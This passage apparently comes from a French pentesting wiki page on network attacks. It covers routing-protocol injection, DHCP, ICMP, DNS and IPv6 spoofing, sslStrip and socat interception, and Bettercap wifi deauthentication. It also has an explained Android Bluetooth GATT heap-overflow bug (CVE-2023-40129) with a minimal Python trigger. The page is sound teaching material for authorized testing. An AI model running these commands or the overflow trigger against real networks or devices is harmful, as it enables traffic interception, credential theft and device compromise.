### FHRP (GLBP & HSRP) Attacks <a href="#id-6196" id="id-6196"></a>

**FHRP** (First Hop Redundancy Protocol) est une classe de protocoles réseau conçue pour **créer un système de routage redondant actif**. Avec FHRP, des routeurs physiques peuvent être combinés en un seul dispositif logique, ce qui augmente la tolérance aux pannes et aide à répartir la charge.

**Les ingénieurs de Cisco Systems ont développé deux protocoles FHRP, GLBP et HSRP.**


{{#ref}}
glbp-and-hsrp-attacks.md
{{#endref}}

### RIP

On connaît trois versions du Routing Information Protocol (RIP) : RIP, RIPv2 et RIPng. Les datagrammes sont envoyés aux pairs via le port 520 en utilisant UDP par RIP et RIPv2, tandis que RIPng diffuse les datagrammes sur le port UDP 521 via le multicast IPv6. Le support de l'authentification MD5 a été introduit par RIPv2. En revanche, RIPng n'intègre pas d'authentification native ; il s'appuie sur les en-têtes optionnels IPsec AH et ESP au sein d'IPv6.

- **RIP and RIPv2 :** La communication se fait via des datagrammes UDP sur le port 520.
- **RIPng :** Utilise le port UDP 521 pour diffuser des datagrammes via le multicast IPv6.

Notez que RIPv2 prend en charge l'authentification MD5 tandis que RIPng n'inclut pas d'authentification native, s'appuyant sur les en-têtes IPsec AH et ESP dans IPv6.

### EIGRP Attaques

**EIGRP (Enhanced Interior Gateway Routing Protocol)** est un protocole de routage dynamique. **C'est un protocole à vecteur de distance.** S'il n'y a **aucune authentification** et que les interfaces passives ne sont pas configurées, un **intrus** peut perturber le routage EIGRP et provoquer un **empoisonnement des tables de routage**. De plus, le réseau EIGRP (autrement dit, le système autonome) **est plat et n'est segmenté en aucune zone**. Si un **attaquant injecte une route**, il est probable que cette route se **propage** dans tout le système autonome EIGRP.

Pour attaquer un système EIGRP, il faut **établir un voisinage avec un routeur EIGRP légitime**, ce qui ouvre de nombreuses possibilités, de la reconnaissance basique à diverses injections.

[**FRRouting**](https://frrouting.org/) allows you to implement **a virtual router that supports BGP, OSPF, EIGRP, RIP and other protocols.** All you need to do is deploy it on your attacker’s system and you can actually pretend to be a legitimate router in the routing domain.


{{#ref}}
eigrp-attacks.md
{{#endref}}

[**Coly**](https://code.google.com/p/coly/) has capabilities for intercepting EIGRP (Enhanced Interior Gateway Routing Protocol) broadcasts. It also allows for the injection of packets, which can be utilized to alter routing configurations.

### OSPF

Dans le protocole Open Shortest Path First (OSPF), **l'authentification MD5 est couramment utilisée pour assurer des communications sécurisées entre routeurs**. Cependant, cette mesure de sécurité peut être compromise à l'aide d'outils tels que Loki et John the Ripper. Ces outils peuvent capturer et cracker des hachages MD5, exposant la clé d'authentification. Une fois cette clé obtenue, elle peut être utilisée pour injecter de nouvelles informations de routage. Pour configurer les paramètres de route et établir la clé compromise, les onglets _Injection_ et _Connection_ sont utilisés, respectivement.

- **Capture et craquage des hachages MD5 :** Des outils tels que Loki et John the Ripper sont utilisés à cet effet.
- **Configuration des paramètres de route :** Ceci se fait via l'onglet _Injection_.
- **Définition de la clé compromise :** La clé est configurée dans l'onglet _Connection_.

### Other Generic Tools & Sources

- [**Above**](https://github.com/c4s73r/Above): Outil pour scanner le trafic réseau et trouver des vulnérabilités
- Vous pouvez trouver **plus d'informations sur les attaques réseau** [**ici**](https://github.com/Sab0tag3d/MITM-cheatsheet).

## **Spoofing**

L'attaquant configure tous les paramètres réseau (GW, IP, DNS) du nouveau membre du réseau en envoyant de fausses réponses DHCP.
```bash
Ettercap
yersinia dhcp -attack 2 #More parameters are needed
```
### ARP Spoofing

Check the [previous section](#arp-spoofing).

### ICMPRedirect

ICMP Redirect consiste à envoyer un packet ICMP de type 1, code 5 qui indique que l'attacker est le meilleur chemin pour atteindre une IP. Ensuite, lorsque la victim veut contacter l'IP, elle enverra le packet via l'attacker.
```bash
Ettercap
icmp_redirect
hping3 [VICTIM IP ADDRESS] -C 5 -K 1 -a [VICTIM DEFAULT GW IP ADDRESS] --icmp-gw [ATTACKER IP ADDRESS] --icmp-ipdst [DST IP ADDRESS] --icmp-ipsrc [VICTIM IP ADDRESS] #Send icmp to [1] form [2], route to [3] packets sent to [4] from [5]
```
### DNS Spoofing

L'attacker résoudra certains (ou tous) des domaines demandés par la victim.
```bash
set dns.spoof.hosts ./dns.spoof.hosts; dns.spoof on
```
**Configurer son propre DNS avec dnsmasq**
```bash
apt-get install dnsmasq
echo "addn-hosts=dnsmasq.hosts" > dnsmasq.conf
echo "127.0.0.1   domain.example.com" > dnsmasq.hosts
sudo dnsmasq -C dnsmasq.conf --no-daemon
dig @localhost domain.example.com # Test the configured DNS
```
### Passerelles locales

Il existe souvent plusieurs routes vers les systèmes et les réseaux. Après avoir établi une liste d'adresses MAC sur le réseau local, utilisez _gateway-finder.py_ pour identifier les hôtes qui prennent en charge le routage IPv4.

<details>
<summary>Exemple d'utilisation de gateway-finder</summary>
```bash
root@kali:~# git clone https://github.com/pentestmonkey/gateway-finder.git
root@kali:~# cd gateway-finder/
root@kali:~# arp-scan -l | tee hosts.txt
Interface: eth0, datalink type: EN10MB (Ethernet)
Starting arp-scan 1.6 with 256 hosts (http://www.nta-monitor.com/tools/arp-scan/)
10.0.0.100     00:13:72:09:ad:76       Dell Inc.
10.0.0.200     00:90:27:43:c0:57       INTEL CORPORATION
10.0.0.254     00:08:74:c0:40:ce       Dell Computer Corp.

root@kali:~/gateway-finder# ./gateway-finder.py -f hosts.txt -i 209.85.227.99
gateway-finder v1.0 http://pentestmonkey.net/tools/gateway-finder
[+] Using interface eth0 (-I to change)
[+] Found 3 MAC addresses in hosts.txt
[+] We can ping 209.85.227.99 via 00:13:72:09:AD:76 [10.0.0.100]
[+] We can reach TCP port 80 on 209.85.227.99 via 00:13:72:09:AD:76 [10.0.0.100]
```
</details>


### [Spoofing LLMNR, NBT-NS, and mDNS](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)

Pour la résolution d'hôtes locale lorsque les requêtes DNS échouent, les systèmes Microsoft s'appuient sur **Link-Local Multicast Name Resolution (LLMNR)** et le **NetBIOS Name Service (NBT-NS)**. De même, les implémentations **Apple Bonjour** et **Linux zero-configuration** utilisent **Multicast DNS (mDNS)** pour découvrir les systèmes au sein d'un réseau. En raison du caractère non authentifié de ces protocoles et de leur fonctionnement sur UDP en mode broadcast, ils peuvent être exploités par des attaquants cherchant à rediriger les utilisateurs vers des services malveillants.

Vous pouvez vous faire passer pour des services recherchés par les hôtes en utilisant Responder pour envoyer de fausses réponses.\
Read here more information about [how to Impersonate services with Responder](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md).

### [Spoofing WPAD](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)

Les navigateurs utilisent couramment le **Web Proxy Auto-Discovery (WPAD)** pour acquérir automatiquement les paramètres proxy. Cela implique de récupérer les détails de configuration depuis un serveur, généralement via une URL telle que "http://wpad.example.org/wpad.dat". La découverte de ce serveur par les clients peut se faire de plusieurs manières :

- Via **DHCP**, où la découverte est facilitée par l'utilisation d'une entrée de code spéciale 252.
- Par **DNS**, qui implique la recherche d'un hostname nommé _wpad_ dans le domaine local.
- Via **Microsoft LLMNR and NBT-NS**, qui servent de mécanismes de secours lorsque les requêtes DNS échouent.

L'outil Responder exploite ce protocole en agissant comme un **malicious WPAD server**. Il utilise DHCP, DNS, LLMNR, et NBT-NS pour tromper les clients et les amener à se connecter à lui. Pour approfondir la manière dont les services peuvent être usurpés avec Responder [check this](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md).

### [Spoofing SSDP and UPnP devices](spoofing-ssdp-and-upnp-devices.md)

Vous pouvez proposer différents services sur le réseau pour tenter de **tromper un utilisateur** et le pousser à saisir des **identifiants en clair**. **More information about this attack in** [**Spoofing SSDP and UPnP Devices**](spoofing-ssdp-and-upnp-devices.md)**.**

IPv6 Neighbor Spoofing

This attack is very similar to ARP Spoofing but in the IPv6 world. You can get the victim think that the IPv6 of the GW has the MAC of the attacker.
```bash
sudo parasite6 -l eth0 # This option will respond to every requests spoofing the address that was requested
sudo fake_advertise6 -r -w 2 eth0 <Router_IPv6> #This option will send the Neighbor Advertisement packet every 2 seconds
```
### IPv6 Router Advertisement Spoofing/Flooding

Certains OS configurent par défaut la gateway à partir des paquets RA envoyés sur le réseau. Pour déclarer l'attaquant comme IPv6 router, vous pouvez utiliser :
```bash
sysctl -w net.ipv6.conf.all.forwarding=1 4
ip route add default via <ROUTER_IPv6> dev wlan0
fake_router6 wlan0 fe80::01/16
```
### IPv6 DHCP spoofing

Par défaut, certains OS essaient de configurer le DNS en lisant un paquet DHCPv6 sur le réseau. Un attaquant peut alors envoyer un paquet DHCPv6 pour se faire passer pour le serveur DNS. Le DHCP fournit également une adresse IPv6 à la victime.
```bash
dhcp6.spoof on
dhcp6.spoof.domains <list of domains>

mitm6
```
### HTTP (page factice et injection de code JS)

## Attaques Internet

### sslStrip

En gros, ce que fait cette attaque, c'est que, dans le cas où le **user** essaie d'**access** une page **HTTP** qui est **redirecting** vers la version **HTTPS**. **sslStrip** va **maintain** une **HTTP connection with** le **client and** une **HTTPS connection with** le **server**, de sorte qu'il pourra **sniff** la connexion en **plain text**.
```bash
apt-get install sslstrip
sslstrip -w /tmp/sslstrip.log --all - l 10000 -f -k
#iptables --flush
#iptables --flush -t nat
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
iptables -A INPUT -p tcp --destination-port 10000 -j ACCEPT
```
Plus d'infos [here](https://www.blackhat.com/presentations/bh-dc-09/Marlinspike/BlackHat-DC-09-Marlinspike-Defeating-SSL.pdf).

### sslStrip+ et dns2proxy pour contourner HSTS

La **différence** entre **sslStrip+ et dns2proxy** par rapport à **sslStrip** est qu'ils vont **rediriger**, par exemple, _**www.facebook.com**_ **vers** _**wwww.facebook.com**_ (notez le **"w"** **supplémentaire**) et vont définir **l'adresse de ce domaine comme l'IP de l'attaquant**. Ainsi, le **client** va **se connecter** à _**wwww.facebook.com**_ **(l'attaquant)** mais en coulisses **sslstrip+** va **maintenir** la **connexion réelle** via https avec **www.facebook.com**.

Le **but** de cette technique est d'**éviter HSTS** car _**wwww**.facebook.com_ **ne sera pas** sauvegardé dans le **cache** du navigateur, donc le navigateur sera trompé pour effectuer **l'authentification facebook en HTTP**.\
Notez que pour effectuer cette attaque la victime doit essayer d'accéder initialement à [http://www.faceook.com](http://www.faceook.com) et pas en https. Cela peut être fait en modifiant les liens à l'intérieur d'une page http.

Plus d'infos [here](https://www.bettercap.org/legacy/#hsts-bypass), [here](https://www.slideshare.net/Fatuo__/offensive-exploiting-dns-servers-changes-blackhat-asia-2014) et [here](https://security.stackexchange.com/questions/91092/how-does-bypassing-hsts-with-sslstrip-work-exactly).

**sslStrip or sslStrip+ doesn't work anymore. This is because there are HSTS rules presaved in the browsers, so even if it's the first time that a user access an "important" domain he will access it via HTTPS. Also, notice that the presaved rules and other generated rules can use the flag** [**`includeSubdomains`**](https://hstspreload.appspot.com) **so the** _**wwww.facebook.com**_ **example from before won't work anymore as** _**facebook.com**_ **uses HSTS with `includeSubdomains`.**

TODO: easy-creds, evilgrade, metasploit, factory

## Écoute TCP sur le port
```bash
sudo nc -l -p 80
socat TCP4-LISTEN:80,fork,reuseaddr -
```
## TCP + SSL : écoute sur un port

#### Générer des clés et un certificat auto-signé
```
FILENAME=server
# Generate a public/private key pair:
openssl genrsa -out $FILENAME.key 1024
# Generate a self signed certificate:
openssl req -new -key $FILENAME.key -x509 -sha256 -days 3653 -out $FILENAME.crt
# Generate the PEM file by just appending the key and certificate files:
cat $FILENAME.key $FILENAME.crt >$FILENAME.pem
```
#### Écouter en utilisant un certificat
```
sudo socat -v -v openssl-listen:443,reuseaddr,fork,cert=$FILENAME.pem,cafile=$FILENAME.crt,verify=0 -
```
#### Écouter en utilisant un certificat et rediriger vers les hôtes
```
sudo socat -v -v openssl-listen:443,reuseaddr,fork,cert=$FILENAME.pem,cafile=$FILENAME.crt,verify=0  openssl-connect:[SERVER]:[PORT],verify=0
```
Parfois, si le client vérifie que la CA est valide, vous pouvez **servir un certificat d'un autre hostname signé par une CA**.\
Un autre test intéressant est de servir un c**ertificat du hostname demandé mais auto-signé**.

D'autres choses à tester : essayer de signer le certificat avec un certificat valide qui n'est pas une CA valide. Ou utiliser la clé publique valide, forcer l'utilisation d'un algorithme comme diffie hellman (un algorithme qui n'a pas besoin de déchiffrer quoi que ce soit avec la vraie clé privée) et lorsque le client demande une probe de la vraie clé privée (comme un hash), envoyer une probe factice et s'attendre à ce que le client ne vérifie pas cela.

## Bettercap

<details>
<summary>Commandes Bettercap courantes</summary>
```bash
# Events
events.stream off #Stop showing events
events.show #Show all events
events.show 5 #Show latests 5 events
events.clear

# Ticker (loop of commands)
set ticker.period 5; set ticker.commands "wifi.deauth DE:AD:BE:EF:DE:AD"; ticker on

# Caplets
caplets.show
caplets.update

# Wifi
wifi.recon on
wifi.deauth BSSID
wifi.show
# Fake wifi
set wifi.ap.ssid Banana
set wifi.ap.bssid DE:AD:BE:EF:DE:AD
set wifi.ap.channel 5
set wifi.ap.encryption false #If true, WPA2
wifi.recon on; wifi.ap
```
</details>


### Active Discovery Notes

Prenez en compte que lorsqu'un paquet UDP est envoyé à un appareil qui n'a pas le port demandé, un ICMP (Port Unreachable) est renvoyé.

### **Découverte ARP**

Les paquets ARP servent à découvrir quelles adresses IP sont utilisées à l'intérieur du réseau. Le PC doit envoyer une requête pour chaque adresse IP possible et seules celles qui sont utilisées répondront.

### **mDNS (multicast DNS)**

Bettercap envoie une requête MDNS (tous les X ms) demandant **\_services\_.dns-sd.\_udp.local**. La machine qui voit ce paquet répond généralement à cette requête. Ensuite, il ne cherche que les machines répondant à "services".

**Tools**

- Avahi-browser (--all)
- Bettercap (net.probe.mdns)
- Responder

### **NBNS (NetBios Name Server)**

Bettercap envoie des paquets broadcast vers le port 137/UDP demandant le nom "CKAAAAAAAAAAAAAAAAAAAAAAAAAAA".

### **SSDP (Simple Service Discovery Protocol)**

Bettercap envoie des paquets SSDP en broadcast à la recherche de toutes sortes de services (UDP Port 1900).

### **WSD (Web Service Discovery)**

Bettercap envoie des paquets WSD en broadcast à la recherche de services (UDP Port 3702).


## Bluetooth (L2CAP/ATT/GATT) Attaques

- Android Fluoride expose des services sur des L2CAP PSMs (e.g., SDP 0x0001, RFCOMM 0x0003, BNEP 0x000F, AVCTP 0x0017/0x001B, AVDTP 0x0019, ATT/GATT 0x001F). Les services s'enregistrent via:
```c
uint16_t L2CA_Register2(uint16_t psm, const tL2CAP_APPL_INFO& p_cb_info,
bool enable_snoop, tL2CAP_ERTM_INFO* p_ertm_info,
uint16_t my_mtu, uint16_t required_remote_mtu,
uint16_t sec_level);
```
- Le framework BlueBlue permet le Scapy-based L2CAP/ATT crafting (built on BlueBorne l2cap_infra). Exemple :
```python
acl  = ACLConnection(src_bdaddr, dst_bdaddr, auth_mode='justworks')
gatt = acl.l2cap_connect(psm=PSM_ATT, mtu=672)
gatt.send_frag(p8(GATT_READ)+p16(1234))
print(gatt.recv())
```
- CVE-2023-40129 (Fluoride GATT): integer underflow in Read Multiple Variable response builder peut provoquer un heap overflow d'environ ~64KB lorsque MTU tronque un élément de longueur variable mais que le champ de longueur +2 n'est pas pris en compte.

<details>
<summary>Cause racine (GATT Read Multiple Variable)</summary>
```c
static void build_read_multi_rsp(tGATT_SR_CMD* p_cmd, uint16_t mtu) {
uint16_t ii, total_len, len; uint8_t* p; bool is_overflow=false;
len = sizeof(BT_HDR) + L2CAP_MIN_OFFSET + mtu;
BT_HDR* p_buf = (BT_HDR*)osi_calloc(len); p_buf->offset=L2CAP_MIN_OFFSET;
p = (uint8_t*)(p_buf + 1) + p_buf->offset; *p++ = GATT_RSP_READ_MULTI_VAR;
p_buf->len=1;
for (ii=0; ii<p_cmd->multi_req.num_handles; ii++) {
tGATTS_RSP* p_rsp = ...; // dequeued
if (p_rsp) {
total_len = (p_buf->len + p_rsp->attr_value.len);
if (p_cmd->multi_req.variable_len) total_len += 2;
if (total_len > mtu) {
len = p_rsp->attr_value.len - (total_len - mtu); // BUG: ignores +2
is_overflow = true;
} else { len = p_rsp->attr_value.len; }
if (p_cmd->multi_req.variable_len) { UINT16_TO_STREAM(p, len); p_buf->len += 2; }
memcpy(p, p_rsp->attr_value.value, len); // heap overflow
if (!is_overflow) p += len; p_buf->len += len; if (is_overflow) break;
}
}
}
```
- Sur les entrées à longueur variable, the overflow path soustrait uniquement (total_len - mtu), en ignorant le champ de longueur +2, donc len underflows (e.g., 0xFFFE) et memcpy écrit ~64KB au-delà de la fin du buffer.
</details>

- Déclencheur minimal non authentifié (petit MTU force un underflow sur le 4th attribute):
```python
# GATT_REQ_READ_MULTI_VAR (0x20), MTU=55
acl  = ACLConnection(interface, bdaddr)
gatt = acl.l2cap_connect(psm=PSM_ATT, mtu=55)
pkt  = b'\x20'  # opcode
pkt += p16(9); pkt += p16(9); pkt += p16(9); pkt += p16(9)
gatt.send(pkt)
# On 4th insert: p_buf->len=55 (1 + 3*(16+2)), total_len=73 -> len=16-(73-55)=-2 -> ~64KB overwrite
```
### Télécom / Mobile-Core (GTP) Exploitation


{{#ref}}
telecom-network-exploitation.md
{{#endref}}

## Références

- [https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9](https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9)
- **Network Security Assessment: Know Your Network (3rd edition)**
- **Practical IoT Hacking: The Definitive Guide to Attacking the Internet of Things. Par Fotios Chantzis, Ioannis Stais, Paulino Calderon, Evangelos Deirmentzoglou, Beau Wood**
- [https://medium.com/@cursedpkt/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9](https://medium.com/@cursedpkt/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9)
- [Paint it blue: Attacking the bluetooth stack (Synacktiv)](https://www.synacktiv.com/en/publications/paint-it-blue-attacking-the-bluetooth-stack)
- [BlueBorne L2CAP testing infra (l2cap_infra)](https://github.com/ArmisSecurity/blueborne/tree/master/l2cap_infra)



{{#include ../../banners/hacktricks-training.md}}
